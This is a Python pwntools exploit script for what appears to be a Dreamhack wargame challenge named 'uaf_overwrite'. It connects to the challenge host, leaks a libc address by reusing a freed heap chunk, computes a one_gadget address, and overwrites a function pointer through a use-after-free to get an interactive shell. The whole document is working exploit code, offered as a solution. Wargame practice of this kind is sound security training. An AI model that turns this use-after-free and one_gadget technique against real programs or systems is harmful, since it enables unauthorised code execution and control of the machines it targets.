#!/usr/bin/python3

from pwn import *

p = remote("host1.dreamhack.games", 14057)
e = ELF("./uaf_overwrite")

sla = lambda t, s: p.sendlineafter(t, s)

def human(weight, age):
    sla("> ", str(1))
    sla(": ", str(weight))
    sla(": ", str(age))

def robot(weight):
    sla("> ", str(2))
    sla(": ", str(weight))

def custom(size, data, idx):
    sla("> ", str(3))
    sla("Size: ", str(size))
    sla("Data: ", data)
    sla("idx: ", str(idx))

def leak(size, data, idx):
    sla("> ", str(3))
    sla("Size: ", str(size))
    p.sendafter("Data: ", data)
    p.recvuntil(": ")
    leak = u64(p.recvn(6).ljust(8, b"\x00")) - 0x3ebc43
    sla("idx: ", str(idx))
    return leak

custom(0x500, "AAAA", -1)
custom(0x500, "BBBB", -1)
custom(0x500, "AAAA", 0)
libc = leak(0x500, "C", -1)

oneshot = libc + 0x10a41c

human(70, oneshot)
robot(700)

p.interactive()
